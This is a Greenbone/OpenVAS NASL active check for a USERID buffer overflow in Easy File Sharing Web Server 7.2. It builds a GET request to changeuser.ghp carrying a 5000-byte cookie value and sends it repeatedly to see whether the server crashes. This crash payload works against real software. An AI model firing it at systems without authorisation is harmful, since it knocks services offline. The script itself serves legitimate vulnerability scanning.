# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:efssoft:easy_file_sharing_web_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806516");
  script_version("2025-03-24T05:38:38+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2025-03-24 05:38:38 +0000 (Mon, 24 Mar 2025)");
  script_tag(name:"creation_date", value:"2015-11-19 18:25:40 +0530 (Thu, 19 Nov 2015)");
  script_name("Easy File Sharing Web Server <= 7.2 USERID Buffer Overflow Vulnerability - Active Check");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_easy_file_sharing_web_server_detect.nasl");
  script_mandatory_keys("Easy/File/Sharing/WebServer/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38526");

  script_tag(name:"summary", value:"Easy File Sharing Web Server is prone to a buffer overflow
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET
  and check whether it is able to crash or not.");

  script_tag(name:"insight", value:"The flaw is due to an error when processing
  web requests and can be exploited to cause a buffer overflow via an overly long
  string passed to USERID in a GET request to 'changeuser.ghp' script.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition.");

  script_tag(name:"affected", value:"Easy File Sharing Web Server version 7.2 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

if(http_is_dead(port:port))
  exit(0);

host = http_host_name(port:port);

useragent = http_get_user_agent();

url = "/changeuser.ghp";

UserID = crap(length:5000, data:"A");

req = 'GET ' + url + ' HTTP/1.1\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Host: '+ host + '\r\n' +
      'Referer: http://' + host + '/\r\n' +
      'Cookie: SESSIONID=6771; UserID=' + UserID + '; PassWD=;\r\n' +
      'Conection: Keep-Alive' + '\r\n\r\n';

# nb: Send multiple times, inconsistency issue
for(j = 0; j < 5; j++) {
  http_send_recv(port:port, data:req);
  if(http_is_dead(port:port)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
